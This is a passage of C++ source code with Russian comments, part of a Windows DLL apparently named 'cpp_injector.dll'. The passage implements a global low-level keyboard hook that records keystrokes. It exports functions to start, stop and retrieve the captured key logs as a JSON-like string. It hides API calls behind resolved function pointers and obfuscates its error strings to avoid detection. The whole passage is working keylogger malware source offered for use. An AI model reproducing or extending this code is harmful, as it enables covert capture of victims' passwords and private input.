                    // Добавить другие нужные клавиши F1-F12 и т.д.
                    default:
                        char buffer[32];
                        sprintf(buffer, "[VK_%lu]", vkCode);
                        keyString = buffer;
                        break;
                 }
            }

            // Добавляем строку в буфер (с блокировкой)
            if (!keyString.empty()) {
                std::lock_guard<std::mutex> lock(g_bufferMutex);
                g_keyBuffer.push_back(keyString);
                 // printf("[Keylogger] Logged: %s\n", keyString.c_str()); // Отладочный вывод
            }
        }
    }

    // Обязательно вызываем следующий хук в цепочке
    return ptrCallNextHookEx ? ptrCallNextHookEx(g_hKeyboardHook, nCode, wParam, lParam) : 0;
}

// --- Функция для запуска цикла обработки сообщений в отдельном потоке ---
DWORD WINAPI MessageLoopThread(LPVOID lpParam) {
    if (!ptrGetMessageW || !ptrTranslateMessage || !ptrDispatchMessageW) {
        printf("[Keylogger] Message loop functions not initialized! Thread exiting.\n");
        return 1;
    }

    printf("[Keylogger] Message loop thread started.\n");
    MSG msg;
    // Цикл нужен для обработки сообщений хука
    while (ptrGetMessageW(&msg, NULL, 0, 0) > 0) { 
        ptrTranslateMessage(&msg);
        ptrDispatchMessageW(&msg);
    }
     printf("[Keylogger] Message loop thread finished.\n");
    return 0;
}

// --- Функция для запуска кейлоггера ---
EXPORT_FUNC int StartKeylogger(char** errorMsg) {
    *errorMsg = NULL;
    if (g_keyloggerRunning) {
        printf("[Keylogger] Already running.\n");
        return 0; // Уже запущен
    }

    if (!InitializeApiPointers()) {
        ObfuscatedString err = OBFUSCATED("Failed to initialize API pointers for Keylogger.");
        *errorMsg = deobfuscate(err.data, err.length);
        return 4001;
    }

    // Запускаем цикл обработки сообщений в отдельном потоке
    g_messageLoopThread = CreateThread(NULL, 0, MessageLoopThread, NULL, 0, NULL);
    if (g_messageLoopThread == NULL) {
        DWORD lastError = GetLastError();
        printf("[Keylogger] Failed to create message loop thread. Error: %lu\n", lastError);
        *errorMsg = get_windows_error_message(lastError);
        return 4002;
    }

    // Устанавливаем глобальный хук на клавиатуру
    // HINSTANCE hMod = GetModuleHandle(NULL); // НЕПРАВИЛЬНО для LL хука в DLL
    HINSTANCE hMod = GetModuleHandleW(L"cpp_injector.dll"); // Нужно имя нашей DLL
     if (!hMod) {
         // Попробуем получить хендл текущего модуля другим способом, если DLL не имеет имени
          MEMORY_BASIC_INFORMATION mbi;
         VirtualQuery((LPCVOID)LowLevelKeyboardProc, &mbi, sizeof(mbi));
         hMod = (HINSTANCE)mbi.AllocationBase;
         if (!hMod) {
             DWORD lastError = GetLastError();
             printf("[Keylogger] Failed to get module handle for DLL. Error: %lu\n", lastError);
             ObfuscatedString err = OBFUSCATED("Failed get DLL module handle for hook.");
            *errorMsg = deobfuscate(err.data, err.length);
            // Закрыть поток? Да, иначе он будет висеть.
            TerminateThread(g_messageLoopThread, 1); // Грубое завершение
            CloseHandle(g_messageLoopThread);
            g_messageLoopThread = NULL;
            return 4003;
         }
          printf("[Keylogger] Module handle obtained via VirtualQuery: %p\n", hMod);
     } else {
         printf("[Keylogger] Module handle obtained via GetModuleHandleW: %p\n", hMod);
     }


    g_hKeyboardHook = ptrSetWindowsHookExW(WH_KEYBOARD_LL, LowLevelKeyboardProc, hMod, 0);
    
    if (g_hKeyboardHook == NULL) {
        DWORD lastError = GetLastError();
        printf("[Keylogger] SetWindowsHookExW failed. Error: %lu\n", lastError);
        *errorMsg = get_windows_error_message(lastError);
        // Закрыть поток
        TerminateThread(g_messageLoopThread, 1); // Грубое завершение
        CloseHandle(g_messageLoopThread);
        g_messageLoopThread = NULL;
        return 4004;
    }

    g_keyloggerRunning = TRUE;
    printf("[Keylogger] Started successfully. Hook handle: %p\n", g_hKeyboardHook);
    return 0; // Успех
}

// --- Функция для остановки кейлоггера ---
EXPORT_FUNC int StopKeylogger(char** errorMsg) {
     *errorMsg = NULL;
     if (!g_keyloggerRunning) {
         printf("[Keylogger] Not running.\n");
         return 0;
     }

     if (!ptrUnhookWindowsHookEx) {
         ObfuscatedString err = OBFUSCATED("UnhookWindowsHookEx function pointer is null.");
         *errorMsg = deobfuscate(err.data, err.length);
         return 4005;
     }

     BOOL unhooked = FALSE;
     if (g_hKeyboardHook) {
         unhooked = ptrUnhookWindowsHookEx(g_hKeyboardHook);
         g_hKeyboardHook = NULL;
     }

     // Остановить поток с циклом сообщений
     if (g_messageLoopThread) {
         // Посылаем сообщение WM_QUIT, чтобы цикл завершился штатно
         // PostThreadMessage(GetThreadId(g_messageLoopThread), WM_QUIT, 0, 0);
         // TODO: PostThreadMessage может быть небезопасным или не сработать
         // Более надежно - использовать флаг и проверку в цикле, но это усложнение.
         // Пока что используем TerminateThread, хотя это не рекомендуется.
         TerminateThread(g_messageLoopThread, 0); // Завершаем поток
         CloseHandle(g_messageLoopThread);
         g_messageLoopThread = NULL;
     }

     g_keyloggerRunning = FALSE;
     if (unhooked) {
         printf("[Keylogger] Stopped successfully.\n");
         return 0; // Успех
     } else {
          printf("[Keylogger] UnhookWindowsHookEx failed or hook was already null.\n");
          // Возможно, стоит вернуть ошибку, если unhooked == FALSE? Зависит от логики.
          // *errorMsg = get_windows_error_message(GetLastError()); // Если нужно передать ошибку
          return 4006; // Возвращаем код ошибки
     }
}

// --- Функция для получения логов кейлоггера --- 
// Возвращает JSON-подобную строку ["log1", "log2", ...]
// Вызывающая сторона ДОЛЖНА освободить память с помощью free_error_message.
EXPORT_FUNC char* GetKeyLogs() {
    std::lock_guard<std::mutex> lock(g_bufferMutex);
    if (g_keyBuffer.empty()) {
        return NULL; // Нет логов
    }

    std::string result = "[";
    bool first = true;
    for (const auto& log : g_keyBuffer) {
        if (!first) {
            result += ", ";
        }
        // Экранируем кавычки и бэкслеши внутри строки
        std::string escaped_log;
        for (char c : log) {
            if (c == '"' || c == '\\') {
                escaped_log += '\\';
            }
            escaped_log += c;
        }
        result += "\"" + escaped_log + "\"";
        first = false;
    }
    result += "]";

    // Очищаем буфер после получения логов
    g_keyBuffer.clear();

    // Копируем результат в C-строку для возврата
    char* c_result = (char*)malloc(result.length() + 1);
    if (!c_result) {
        printf("[Keylogger] Failed to allocate memory for key logs result.\n");
        return NULL;
    }
    strcpy(c_result, result.c_str());

    return c_result;
} 